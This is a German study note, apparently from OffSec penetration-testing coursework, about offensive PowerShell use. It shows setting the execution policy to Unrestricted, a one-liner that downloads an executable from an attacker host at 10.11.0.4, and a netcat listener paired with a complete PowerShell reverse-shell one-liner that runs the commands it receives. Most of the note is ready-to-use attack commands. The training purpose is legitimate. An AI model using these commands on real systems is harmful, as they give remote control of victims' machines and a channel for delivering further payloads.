# OffSec - Powershell und Powercat

## Execution Policy

Um #Powershell effektiv in einem #Penetrationtest verwenden zu können, muss die #Execution-Policy auf "Unrestricted" gesetzt werden.

`Set-ExecutionPolicy Unrestricted`

Mit folgendem Befehl kann überprüft werden, wie die Execution-Policy gesetzt ist:

`Get-ExecutionPolicy`

## File Transfers

Mit #Powershell können auch #FileTransfers durchgeführt werden.
Wie folgt wird ein #Download vorgenommen - Vorausetzung ist, dass auf dem Host ein HTTP-Server eröffnet wurde siehe: [[OffSec - Simple HTTP-Server]] 

`powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"`


## Reverse Shell

Auch mit #Powershell ist es möglich eine #Reverseshell zu erzeugen.

Hierzu einen #Listener auf dem Angreifer-PC öffnen:
`sudo nc -lnvp 443`

Mit folgendem #One-Liner wird dann die Verbindung aufgebaut:

```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

